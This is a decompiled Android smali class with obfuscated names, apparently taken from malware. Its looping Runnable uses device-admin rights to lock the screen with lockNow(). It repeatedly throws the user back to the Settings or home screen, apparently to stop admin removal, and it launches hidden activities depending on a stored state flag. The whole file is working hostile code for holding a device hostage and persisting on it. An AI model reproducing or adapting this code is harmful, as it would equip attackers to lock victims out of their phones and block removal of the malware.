.class final Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field private synthetic a:Landroid/os/Handler;

.field private synthetic a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;


# direct methods
.method constructor <init>(Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    iput-object p2, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Landroid/os/Handler;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 8

    const v7, 0x74008000

    const/4 v3, 0x1

    const/high16 v6, 0x10000000

    const/4 v2, 0x0

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    const-string v1, "device_policy"

    invoke-virtual {v0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    iget-object v4, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    invoke-virtual {v4}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/ekvrxzfiopfbeglxzcuqigwlbadhiaqagspwclrctfypesbhmdmnrhumktqusvtowjkjyojnyzvxdn;

    invoke-direct {v1, v4, v5}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    const-string v4, "keyguard"

    invoke-virtual {v1, v4}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/KeyguardManager;

    const-string v4, "keyguard"

    invoke-virtual {v1, v4}, Landroid/app/KeyguardManager;->newKeyguardLock(Ljava/lang/String;)Landroid/app/KeyguardManager$KeyguardLock;

    sget v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->a:I

    if-ne v1, v3, :cond_0

    invoke-virtual {v0}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.SETTINGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    invoke-virtual {v1, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    invoke-virtual {v1, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->startActivity(Landroid/content/Intent;)V

    const/16 v0, 0x64

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->b:I

    :cond_0
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->a:I

    const/4 v1, 0x3

    if-ne v0, v1, :cond_1

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    invoke-virtual {v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v4, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/bhvvjpptfqynabrvpzdiqynxfkeeaolmfuixuksczbmcsllywczhgmoxjrqwkghdgidstutarnjewo;

    invoke-direct {v0, v1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    invoke-virtual {v1, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->startActivity(Landroid/content/Intent;)V

    sput v2, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->a:I

    :cond_1
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->a:I

    const/4 v1, 0x4

    if-ne v0, v1, :cond_2

    new-instance v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    invoke-virtual {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {v1, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;-><init>(Landroid/content/Context;)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x17

    if-lt v0, v4, :cond_4

    const-string v0, "dchec2k2"

    invoke-virtual {v1, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_4

    new-instance v0, Landroid/content/Intent;

    iget-object v3, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    invoke-virtual {v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/bvgfinfgwxdlptrwnhojtulgsjzetimnqzklqbpmakydqosemavbexfirsyhcoaxkzchwcduvpyrju;

    invoke-direct {v0, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v6}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    iget-object v3, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    invoke-virtual {v3, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->startActivity(Landroid/content/Intent;)V

    move v0, v2

    :goto_0
    invoke-virtual {v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;->close()V

    sput v2, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->a:I

    if-eqz v0, :cond_2

    sput v2, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->a:I

    :cond_2
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->a:I

    const/4 v1, 0x6

    if-ne v0, v1, :cond_3

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;

    invoke-virtual {v1, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->startActivity(Landroid/content/Intent;)V

    sput v2, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->a:I

    :cond_3
    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/A;->a:Landroid/os/Handler;

    sget v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/qsrccvgemwdivuzhjqmkkxosywfoetxmgtjbgdlqlcruhdbivbpkoujznrxpspifznynaywatfaelh;->b:I

    int-to-long v2, v1

    invoke-virtual {v0, p0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :cond_4
    move v0, v3

    goto :goto_0
.end method
